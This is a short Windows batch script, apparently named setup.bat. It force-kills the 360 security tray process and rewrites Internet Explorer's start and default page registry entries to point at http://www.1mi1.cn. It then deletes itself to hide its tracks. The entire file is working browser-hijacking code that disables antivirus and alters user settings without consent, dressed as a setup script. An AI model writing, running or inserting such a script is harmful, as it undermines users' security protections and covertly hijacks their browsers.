@echo off
@taskkill /f /im 360Tray.exe>nul 2>nul
reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Start Page" /t reg_sz /d http://www.1mi1.cn /f 
reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Default_Page_URL" /t reg_sz /d http://www.1mi1.cn /f 
del /f /s /q setup.bat